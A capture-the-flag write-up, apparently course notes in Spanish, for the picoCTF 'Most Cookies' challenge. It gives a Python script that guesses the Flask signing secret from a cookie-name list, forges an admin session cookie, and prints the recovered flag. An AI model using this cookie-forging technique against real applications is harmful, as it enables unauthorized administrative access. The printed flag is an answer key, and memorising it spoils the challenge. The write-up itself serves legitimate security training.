## Description

Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)
#### Hints
- How secure is a flask cookie?
## python code modified
```python
# https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe#file-manageflasksession-py
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

cookies = ["snickerdoodle", "chocolate chip", "oatmeal raisin",

                 "gingersnap", "shortbread", "peanut butter", "whoopie pie",

                   "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",

                   "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon",

                     "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron",

                     "black and white", "white chocolate macadamia"]

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )

        return URLSafeTimedSerializer(secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)


# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

for name in cookies:
    session = {}
    session["very_auth"]="admin"
    print(name)
    cookie= encodeFlaskCookie(name, session)
    r = requests.get("http://mercury.picoctf.net:44693/display", cookies = {"session" : cookie}, allow_redirects = False)
    if "picoCTF" in r.text:
        print(r.text)
        break

  
if __name__=='__main__':
    sk = 'youWillNeverGuess'
    sessionDict = {u'Hello':'World'}
    cookie = encodeFlaskCookie(sk, sessionDict)
    decodedDict = decodeFlaskCookie(sk, cookie)
    assert sessionDict==decodedDict
```
## Solución

```shell
┌──(kali㉿kali)-[~/…/notas-seguridad-redes2024/web_picoCTF/parte4/most_cookies]
└─$ python3 most_solve.py
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Most Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Reset</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Most Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
                                                                                     
┌──(kali㉿kali)-[~/…/notas-seguridad-redes2024/web_picoCTF/parte4/most_cookies]
└─$ 
```


## Bandera
```css
flag: picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}
```
## Notas Adicionales
Se tomaron las cookies del código de python que nos proporcionaron y las añadimos al código de python que se anexa en la parte de arriba, el cuál fue obtenido de un repositorio de github, para crackear la cookie correcta. Luego se ejecuta el script de python desde una términal en kali linux y obtenemos la bandera.
# comandos utilizados

## Referencias
****